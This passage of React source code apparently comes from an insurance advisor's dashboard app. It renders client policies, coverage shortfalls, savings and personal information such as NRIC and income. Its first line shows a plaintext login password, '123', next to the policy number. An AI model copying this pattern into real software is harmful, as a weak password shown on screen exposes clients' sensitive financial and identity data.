          <p style={{ color: "#94a3b8", margin: "4px 0 0", fontSize: 13 }}>Policy: {client.policyNumber} · Login PW: 123</p>
        </div>
      </div>
      <div style={{ display: "flex", gap: 6, marginBottom: 24 }}>
        {tabs.map(t => (
          <button key={t} onClick={() => setTab(t)} style={{
            padding: "8px 16px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
            background: tab === t ? "#2563eb" : "rgba(255,255,255,0.06)",
            color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400, textTransform: "capitalize"
          }}>{t}</button>
        ))}
        <button onClick={() => setShowAddPolicy(true)} style={{
          marginLeft: "auto", padding: "8px 16px", borderRadius: 6, background: "#059669",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer", fontSize: 13
        }}>+ Add Policy</button>
      </div>

      {showAddPolicy && (
        <AddPolicyForm
          client={client} clients={clients} saveClients={saveClients}
          onClose={() => setShowAddPolicy(false)} updateClient={updateClient}
        />
      )}

      {tab === "dashboard" && <DashboardTab client={client} />}
      {tab === "policies" && <PoliciesTab client={client} clients={clients} saveClients={saveClients} updateClient={updateClient} />}
      {tab === "coverage" && <CoverageTab client={client} />}
      {tab === "savings" && <SavingsTab client={client} />}
      {tab === "info" && <InfoTab client={client} />}
    </div>
  );
}

function AdvisorOverview({ clients }) {
  const totalPolicies = clients.reduce((s, c) => s + c.policies.length, 0);
  const totalPremium = clients.reduce((s, c) =>
    s + c.policies.reduce((ps, p) => ps + (p.premium?.annual || 0), 0), 0);
  const totalCoverage = clients.reduce((s, c) =>
    s + Object.values(c.coverageBreakdown || {}).reduce((cs, v) => cs + (v?.current || 0), 0), 0);

  return (
    <div>
      <h2 style={{ margin: "0 0 24px", fontSize: 22 }}>Portfolio Overview</h2>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 16, marginBottom: 32 }}>
        {[
          ["Total Clients", clients.length, "#2563eb"],
          ["Total Policies", totalPolicies, "#7c3aed"],
          ["Total Annual Premium", fmt(totalPremium), "#059669"],
          ["Total Coverage", fmt(totalCoverage), "#d97706"],
        ].map(([label, val, color]) => (
          <div key={label} style={{
            background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)",
            borderRadius: 12, padding: "20px 24px"
          }}>
            <div style={{ color: "#94a3b8", fontSize: 12, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</div>
            <div style={{ fontSize: 26, fontWeight: 800, color, marginTop: 8 }}>{val}</div>
          </div>
        ))}
      </div>
      <div style={{
        background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
        borderRadius: 12, padding: 24
      }}>
        <h3 style={{ margin: "0 0 16px" }}>Client Shortfall Analysis</h3>
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["Client", "Life/TI Shortfall", "TPD Shortfall", "CI Shortfall", "Early CI Shortfall"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 12px", color: "#94a3b8", fontSize: 12, borderBottom: "1px solid rgba(255,255,255,0.1)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {clients.map(c => (
                <tr key={c.id}>
                  <td style={{ padding: "10px 12px", fontWeight: 600 }}>{c.name}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.lifeTI?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.tpd?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.criticalIllness?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#fb923c" }}>{fmt(c.coverageBreakdown?.earlyIllness?.shortfall)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

// ============================================================
// ADD POLICY FORM
// ============================================================
function AddPolicyForm({ client, clients, saveClients, onClose, updateClient }) {
  const [p, setP] = useState({
    type: "Whole Life Limited", insurer: "NTUC Income", planName: "",
    policyNumber: "", insured: "Self",
    deathCoverage: 0, tpdCoverage: 0, ciCoverage: 0, earlyCI: 0,
    frequency: "Annually", paymentMode: "Paynow",
    premiumAmount: 0, annualPremium: 0,
    startDate: "", premiumTerm: 0, maturityDate: "", cashValue: 0, remarks: "", status: "Active"
  });

  const policyTypes = ["Whole Life Limited","Whole Life","Term Life","Critical Illness",
    "Early Critical Illness","Integrated Plan","Integrated Plan Rider","Long Term Care",
    "Home Insurance","Travel Insurance (Annual)","Education","Personal Accident","Others"];

  function save() {
    const newPol = {
      id: Date.now(),
      type: p.type, insurer: p.insurer, planName: p.planName,
      policyNumber: p.policyNumber, insured: p.insured,
      coverage: { death: +p.deathCoverage, tpd: +p.tpdCoverage, ci: +p.ciCoverage, earlyCI: +p.earlyCI },
      premium: { frequency: p.frequency, paymentMode: p.paymentMode, amount: +p.premiumAmount, annual: +p.annualPremium },
      startDate: p.startDate, premiumTerm: +p.premiumTerm, maturityDate: p.maturityDate,
      cashValue: +p.cashValue, remarks: p.remarks, status: p.status, claimed: 0,
    };
    const updated = { ...client, policies: [...client.policies, newPol] };
    updateClient(updated);
    onClose();
  }

  return (
    <div style={{
      background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.12)",
      borderRadius: 12, padding: 24, marginBottom: 24
    }}>
      <h3 style={{ margin: "0 0 20px", fontSize: 16 }}>Add New Policy</h3>
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 14 }}>
        {[
          ["Policy Type", "type", "select", policyTypes],
          ["Insurer", "insurer", "text"],
          ["Plan Name", "planName", "text"],
          ["Policy Number", "policyNumber", "text"],
          ["Insured", "insured", "select", ["Self","Spouse","Elder Kid","Younger Kid","Youngest Kid"]],
          ["Status", "status", "select", ["Active","Lapsed","Matured","Terminated","Claimed"]],
          ["Death Coverage ($)", "deathCoverage", "number"],
          ["TPD Coverage ($)", "tpdCoverage", "number"],
          ["CI Coverage ($)", "ciCoverage", "number"],
          ["Early CI Coverage ($)", "earlyCI", "number"],
          ["Premium Frequency", "frequency", "select", ["Monthly","Quarterly","Half Yearly","Annually","Lump Sum"]],
          ["Payment Mode", "paymentMode", "select", ["Cash","GIRO","CPF","Paynow","Credit Card","Cheque","Others"]],
          ["Premium Amount ($)", "premiumAmount", "number"],
          ["Annual Premium ($)", "annualPremium", "number"],
          ["Start Date", "startDate", "date"],
          ["Premium Term (yrs)", "premiumTerm", "number"],
          ["Maturity Date", "maturityDate", "date"],
          ["Cash Value ($)", "cashValue", "number"],
          ["Remarks", "remarks", "text"],
        ].map(([label, key, type, opts]) => (
          <div key={key} style={key === "remarks" ? { gridColumn: "span 3" } : {}}>
            <label style={{ color: "#94a3b8", fontSize: 11, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</label>
            {type === "select" ? (
              <select value={p[key]} onChange={e => setP(x => ({ ...x, [key]: e.target.value }))}
                style={{ ...inputStyle, marginTop: 4 }}>
                {opts.map(o => <option key={o} value={o}>{o}</option>)}
              </select>
            ) : (
              <input type={type} value={p[key]}
                onChange={e => setP(x => ({ ...x, [key]: e.target.value }))}
                style={{ ...inputStyle, marginTop: 4 }} />
            )}
          </div>
        ))}
      </div>
      <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
        <button onClick={save} style={{
          padding: "8px 20px", borderRadius: 8, background: "#059669",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer"
        }}>Save Policy</button>
        <button onClick={onClose} style={{
          padding: "8px 20px", borderRadius: 8, border: "1px solid rgba(255,255,255,0.15)",
          background: "transparent", color: "#94a3b8", cursor: "pointer"
        }}>Cancel</button>
      </div>
    </div>
  );
}

// ============================================================
// DASHBOARD TAB (mirrors PDF overview)
// ============================================================
function DashboardTab({ client }) {
  const cb = client.coverageBreakdown || {};
  const barData = [
    { name: "Life & TI", ideal: cb.lifeTI?.ideal || 0, current: cb.lifeTI?.current || 0, shortfall: cb.lifeTI?.shortfall || 0 },
    { name: "TPD", ideal: cb.tpd?.ideal || 0, current: cb.tpd?.current || 0, shortfall: cb.tpd?.shortfall || 0 },
    { name: "Critical Illness", ideal: cb.criticalIllness?.ideal || 0, current: cb.criticalIllness?.current || 0, shortfall: cb.criticalIllness?.shortfall || 0 },
    { name: "Early CI", ideal: cb.earlyIllness?.ideal || 0, current: cb.earlyIllness?.current || 0, shortfall: cb.earlyIllness?.shortfall || 0 },
  ];

  const lifeTotal = (cb.lifeTI?.current || 0) + (cb.tpd?.current || 0) + (cb.criticalIllness?.current || 0) + (cb.earlyIllness?.current || 0);
  const pieData = [
    { name: "Life & TI", value: cb.lifeTI?.current || 0 },
    { name: "TPD", value: cb.tpd?.current || 0 },
    { name: "Critical Illness", value: cb.criticalIllness?.current || 0 },
    { name: "Early CI", value: cb.earlyIllness?.current || 0 },
  ].filter(d => d.value > 0);

  const totalPolicies = client.policies.length;
  const totalPremium = client.policies.reduce((s, p) => s + (p.premium?.annual || 0), 0);

  return (
    <div>
      {/* KPI Row */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 16, marginBottom: 24 }}>
        {[
          ["Active Policies", totalPolicies, "📋", "#2563eb"],
          ["Annual Premium", fmt(totalPremium), "💰", "#059669"],
          ["Total Coverage", fmt(lifeTotal), "🛡️", "#7c3aed"],
          ["Endowment Value", fmt(cb.endowment?.current), "📈", "#d97706"],
        ].map(([label, val, icon, color]) => (
          <div key={label} style={{
            background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
            borderRadius: 12, padding: "18px 22px"
          }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
              <div>
                <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</div>
                <div style={{ fontSize: 22, fontWeight: 800, color, marginTop: 6 }}>{val}</div>
              </div>
              <div style={{ fontSize: 20 }}>{icon}</div>
            </div>
          </div>
        ))}
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: 20, marginBottom: 20 }}>
        {/* Coverage Bar Chart */}
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Coverage & Shortfall</h3>
          <ResponsiveContainer width="100%" height={240}>
            <BarChart data={barData}>
              <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
              <XAxis dataKey="name" tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <YAxis tickFormatter={v => "$" + (v / 1000) + "k"} tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              <Legend />
              <Bar dataKey="ideal" name="Ideal" fill="#2563eb" radius={[4, 4, 0, 0]} />
              <Bar dataKey="current" name="Current" fill="#059669" radius={[4, 4, 0, 0]} />
              <Bar dataKey="shortfall" name="Shortfall" fill="#ef4444" radius={[4, 4, 0, 0]} />
            </BarChart>
          </ResponsiveContainer>
        </div>

        {/* Pie Chart */}
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Current Coverage Mix</h3>
          {pieData.length > 0 ? (
            <ResponsiveContainer width="100%" height={240}>
              <PieChart>
                <Pie data={pieData} cx="50%" cy="50%" innerRadius={50} outerRadius={90}
                  dataKey="value" label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                  labelLine={false}>
                  {pieData.map((_, i) => <Cell key={i} fill={PIE_COLORS[i % PIE_COLORS.length]} />)}
                </Pie>
                <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              </PieChart>
            </ResponsiveContainer>
          ) : (
            <div style={{ color: "#94a3b8", textAlign: "center", marginTop: 60 }}>No coverage data yet</div>
          )}
        </div>
      </div>

      {/* Coverage Breakdown Table */}
      <div style={{ display: "grid", gridTemplateColumns: "1.4fr 1fr", gap: 20 }}>
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Coverage Breakdown</h3>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["Coverage", "Current", "Ideal", "Savings Needed", "Shortfall"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.5, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ["Life & Term/TI", "lifeTI"],
                ["TPD", "tpd"],
                ["Critical Illness", "criticalIllness"],
                ["Early Illness", "earlyIllness"],
                ["Endowment", "endowment"],
              ].map(([label, key]) => {
                const row = cb[key] || {};
                return (
                  <tr key={key}>
                    <td style={{ padding: "10px 10px", fontSize: 13, fontWeight: 600 }}>{label}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13, color: "#60a5fa" }}>{fmt(row.current)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13 }}>{fmt(row.ideal)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13 }}>{fmt(row.savingsNeeded)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13, color: "#f87171", fontWeight: 700 }}>{fmt(row.shortfall)}</td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        <div style={{ display: "grid", gap: 16 }}>
          {/* Medical H&S */}
          <StatusCard title="Medical H&S" items={[
            ["Medishield Life", client.medicalHS?.medishieldLife],
            ["Integrated Plan", client.medicalHS?.integratedPlan],
            ["Rider (add-on)", client.medicalHS?.rider],
          ]} />
          {/* Severe Disability */}
          <StatusCard title="Severe Disability" items={[
            ["CareShield Life", client.severeDisability?.careShieldLife],
            ["ElderShield", client.severeDisability?.elderShield],
            ["LongTerm Care", client.severeDisability?.longTermCare],
          ]} />
          {/* Housing */}
          <StatusCard title="Housing / Dependant" items={[
            ["Dependant Protection Scheme", client.housingDependant?.dependantProtectionScheme],
            ["Home Protection Scheme", client.housingDependant?.homeProtectionScheme],
          ]} />
        </div>
      </div>
    </div>
  );
}

function StatusCard({ title, items }) {
  return (
    <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 18 }}>
      <div style={{ fontSize: 13, fontWeight: 700, color: "#e2e8f0", marginBottom: 10 }}>{title}</div>
      {items.map(([label, val]) => (
        <div key={label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "5px 0", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
          <span style={{ fontSize: 12, color: "#94a3b8" }}>{label}</span>
          <span style={{
            fontSize: 11, fontWeight: 700, padding: "2px 8px", borderRadius: 4,
            background: val === "Yes" ? "rgba(5,150,105,0.2)" : "rgba(100,116,139,0.2)",
            color: val === "Yes" ? "#34d399" : "#94a3b8"
          }}>{val || "—"}</span>
        </div>
      ))}
    </div>
  );
}

// ============================================================
// POLICIES TAB
// ============================================================
function PoliciesTab({ client, clients, saveClients, updateClient }) {
  function deletePolicy(id) {
    const updated = { ...client, policies: client.policies.filter(p => p.id !== id) };
    updateClient(updated);
  }

  const lifePolices = client.policies.filter(p => ["Whole Life Limited","Whole Life","Term Life","Personal Accident","Critical Illness","Early Critical Illness"].includes(p.type));
  const healthPolicies = client.policies.filter(p => ["Integrated Plan","Integrated Plan Rider","Long Term Care"].includes(p.type));
  const generalPolicies = client.policies.filter(p => ["Home Insurance","Travel Insurance (Annual)"].includes(p.type));
  const savingsPolicies = client.policies.filter(p => ["Education","Endowment","Retirement"].includes(p.type));

  return (
    <div style={{ display: "grid", gap: 24 }}>
      {[
        ["Life Insurance Policies", lifePolices],
        ["Health & Disability Insurance", healthPolicies],
        ["General Insurance", generalPolicies],
        ["Savings & Wealth Accumulation", savingsPolicies],
      ].map(([sectionTitle, polList]) => polList.length === 0 ? null : (
        <div key={sectionTitle} style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>{sectionTitle}</h3>
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
              <thead>
                <tr>
                  {["#","Type","Insurer","Plan","Policy No","Insured","Death","TPD","CI","Early CI","Premium","Annual","Start","Term","Status","Action"].map(h => (
                    <th key={h} style={{ textAlign: "left", padding: "8px 8px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)", whiteSpace: "nowrap" }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {polList.map((pol, i) => (
                  <tr key={pol.id} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                    <td style={{ padding: "10px 8px", color: "#94a3b8" }}>{i + 1}</td>
                    <td style={{ padding: "10px 8px", fontWeight: 600 }}>{pol.type}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.insurer}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.planName}</td>
                    <td style={{ padding: "10px 8px", color: "#60a5fa" }}>{pol.policyNumber}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.insured}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.death ? fmt(pol.coverage.death) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.tpd ? fmt(pol.coverage.tpd) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.ci ? fmt(pol.coverage.ci) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.earlyCI ? fmt(pol.coverage.earlyCI) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{fmt(pol.premium?.amount)}</td>
                    <td style={{ padding: "10px 8px", color: "#34d399" }}>{fmt(pol.premium?.annual)}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.startDate || "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.premiumTerm ? pol.premiumTerm + "y" : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>
                      <span style={{
                        padding: "2px 6px", borderRadius: 4, fontSize: 10, fontWeight: 700,
                        background: pol.status === "Active" ? "rgba(5,150,105,0.2)" : "rgba(239,68,68,0.2)",
                        color: pol.status === "Active" ? "#34d399" : "#f87171"
                      }}>{pol.status}</span>
                    </td>
                    <td style={{ padding: "10px 8px" }}>
                      <button onClick={() => deletePolicy(pol.id)} style={{
                        background: "rgba(239,68,68,0.2)", border: "none", color: "#f87171",
                        borderRadius: 4, padding: "2px 8px", cursor: "pointer", fontSize: 11
                      }}>✕</button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      ))}
    </div>
  );
}

// ============================================================
// COVERAGE TAB — detailed calculation
// ============================================================
function CoverageTab({ client }) {
  const cc = client.coverageCalculation || {};
  const rc = client.retirementCalculation || {};

  return (
    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20 }}>
      <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Coverage Calculation</h3>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
          <thead>
            <tr>
              <th style={{ textAlign: "left", padding: "6px 8px", color: "#94a3b8", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>Parameter</th>
              <th style={{ textAlign: "right", padding: "6px 8px", color: "#60a5fa", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>LIFE</th>
              <th style={{ textAlign: "right", padding: "6px 8px", color: "#db2777", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>CRITICAL</th>
            </tr>
          </thead>
          <tbody>
            {[
              ["Monthly Needs", cc.life?.monthlyNeeds, cc.critical?.monthlyNeeds, true],
              ["Annual Amount", cc.life?.annualAmount, cc.critical?.annualAmount, true],
              ["Years Required", cc.life?.yearsRequired, cc.critical?.yearsRequired, false],
              ["Inflation (2-5%)", cc.life?.inflation ? (cc.life.inflation * 100).toFixed(1) + "%" : "—", cc.critical?.inflation ? (cc.critical.inflation * 100).toFixed(1) + "%" : "—", false],
            ].map(([label, lifeV, critV, isMoney]) => (
              <tr key={label}>
                <td style={{ padding: "10px 8px", color: "#94a3b8" }}>{label}</td>
                <td style={{ padding: "10px 8px", textAlign: "right", fontWeight: 600, color: "#60a5fa" }}>{isMoney ? fmt(lifeV) : lifeV}</td>
                <td style={{ padding: "10px 8px", textAlign: "right", fontWeight: 600, color: "#db2777" }}>{isMoney ? fmt(critV) : critV}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Retirement Calculation</h3>
        {[
          ["Monthly Requirement", fmt(rc.monthlyRequirement)],
          ["Annual", fmt(rc.annual)],
          ["Period from Age 65", rc.yearsFromAge65 + " years"],
          ["Inflation (2-5%)", rc.inflation ? (rc.inflation * 100).toFixed(1) + "%" : "—"],
          ["Amount Required", fmt(rc.amountRequired)],
        ].map(([label, val]) => (
          <div key={label} style={{ display: "flex", justifyContent: "space-between", padding: "10px 0", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
            <span style={{ color: "#94a3b8", fontSize: 13 }}>{label}</span>
            <span style={{ fontWeight: 700, fontSize: 13, color: label === "Amount Required" ? "#fbbf24" : "#f1f5f9" }}>{val}</span>
          </div>
        ))}
      </div>

      {/* Policy Detail Breakdown */}
      <div style={{ gridColumn: "span 2", background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Policies Details Breakdown</h3>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
          <thead>
            <tr>
              {["No", "Policy Number", "Plan Name", "Coverage Type", "Sum Assured", "Claimed", "Remaining SA", "Status", "Remarks"].map(h => (
                <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {client.policies.flatMap((pol, pidx) => {
              const rows = [];
              const covTypes = [
                ["Life/TI", pol.coverage?.death],
                ["TPD", pol.coverage?.tpd],
                ["Critical Illness", pol.coverage?.ci],
                ["Early Critical Illness", pol.coverage?.earlyCI],
              ].filter(([, v]) => v && v > 0);

              if (covTypes.length === 0) {
                rows.push(
                  <tr key={pol.id + "_0"} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                    <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{pidx + 1}</td>
                    <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{pol.policyNumber}</td>
                    <td style={{ padding: "8px 10px" }}>{pol.planName}</td>
                    <td style={{ padding: "8px 10px" }}>{pol.type}</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>
                      <span style={{ background: "rgba(5,150,105,0.2)", color: "#34d399", padding: "1px 6px", borderRadius: 4, fontSize: 10 }}>{pol.status}</span>
                    </td>
                    <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{pol.remarks || "—"}</td>
                  </tr>
                );
              } else {
                covTypes.forEach(([covType, amount], ci) => {
                  rows.push(
                    <tr key={pol.id + "_" + ci} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                      <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{ci === 0 ? pidx + 1 : ""}</td>
                      <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{ci === 0 ? pol.policyNumber : ""}</td>
                      <td style={{ padding: "8px 10px" }}>{ci === 0 ? pol.planName : ""}</td>
                      <td style={{ padding: "8px 10px" }}>{covType}</td>
                      <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{fmt(amount)}</td>
                      <td style={{ padding: "8px 10px" }}>{fmt(pol.claimed || 0)}</td>
                      <td style={{ padding: "8px 10px", color: "#34d399" }}>{fmt((amount || 0) - (pol.claimed || 0))}</td>
                      <td style={{ padding: "8px 10px" }}>
                        {ci === 0 && <span style={{ background: "rgba(5,150,105,0.2)", color: "#34d399", padding: "1px 6px", borderRadius: 4, fontSize: 10 }}>{pol.status}</span>}
                      </td>
                      <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{ci === 0 ? (pol.remarks || "—") : ""}</td>
                    </tr>
                  );
                });
              }
              return rows;
            })}
          </tbody>
        </table>
      </div>
    </div>
  );
}

// ============================================================
// SAVINGS TAB
// ============================================================
function SavingsTab({ client }) {
  const savPolicies = client.policies.filter(p => ["Education","Endowment","Retirement"].includes(p.type));
  const totalInvested = savPolicies.reduce((s, p) => s + (p.currentInvested || 0), 0);
  const totalValue = savPolicies.reduce((s, p) => s + (p.currentValue || 0), 0);
  const totalPnL = totalValue - totalInvested;

  const er = client.expectedReturn || [];

  return (
    <div style={{ display: "grid", gap: 20 }}>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 16 }}>
        {[
          ["Total Invested", fmt(totalInvested), "#2563eb"],
          ["Current Value", fmt(totalValue), "#059669"],
          ["Profit / Loss", fmt(totalPnL), totalPnL >= 0 ? "#34d399" : "#f87171"],
        ].map(([l, v, c]) => (
          <div key={l} style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: "20px 24px" }}>
            <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>{l}</div>
            <div style={{ fontSize: 24, fontWeight: 800, color: c, marginTop: 6 }}>{v}</div>
          </div>
        ))}
      </div>

      {savPolicies.length > 0 && (
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Savings Policies</h3>
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
            <thead>
              <tr>
                {["Type","Insurer","Plan","Policy No","Start","Maturity","Invested","Value","P&L%","Remarks"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {savPolicies.map(p => (
                <tr key={p.id} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                  <td style={{ padding: "10px 10px" }}>{p.type}</td>
                  <td style={{ padding: "10px 10px" }}>{p.insurer}</td>
                  <td style={{ padding: "10px 10px" }}>{p.planName}</td>
                  <td style={{ padding: "10px 10px", color: "#60a5fa" }}>{p.policyNumber}</td>
                  <td style={{ padding: "10px 10px" }}>{p.startDate}</td>
                  <td style={{ padding: "10px 10px" }}>{p.maturityDate || "—"}</td>
                  <td style={{ padding: "10px 10px" }}>{fmt(p.currentInvested)}</td>
                  <td style={{ padding: "10px 10px", color: "#34d399" }}>{fmt(p.currentValue)}</td>
                  <td style={{ padding: "10px 10px", color: (p.profitPct || 0) >= 0 ? "#34d399" : "#f87171" }}>{p.profitPct ? p.profitPct.toFixed(2) + "%" : "—"}</td>
                  <td style={{ padding: "10px 10px", color: "#94a3b8" }}>{p.remarks || "—"}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {er.length > 0 && (
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Expected Return Timeline</h3>
          <ResponsiveContainer width="100%" height={200}>
            <BarChart data={er}>
              <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
              <XAxis dataKey="age" tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <YAxis tickFormatter={v => "$" + (v / 1000) + "k"} tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              <Bar dataKey="value" name="Expected Return" fill="#2563eb" radius={[4, 4, 0, 0]} />
            </BarChart>
          </ResponsiveContainer>
        </div>
      )}
    </div>
  );
}

// ============================================================
// INFO TAB
// ============================================================
function InfoTab({ client }) {
  const info = client.info || {};
  const fields = [
    ["Date of Birth", info.dob],
    ["Age", info.age],
    ["NRIC / Passport", info.nric],
    ["Citizenship", info.citizenship],
    ["Marital Status", info.maritalStatus],
    ["Gender", info.gender],
    ["Qualification", info.qualification || info.highestQualification],
    ["Annual Income", info.annualIncome],
    ["Smoker", info.smoker],
    ["Employment Status", info.employmentStatus],
    ["Risk Profile", info.riskProfile],
    ["Preferred Retirement Age", info.retirementAge],
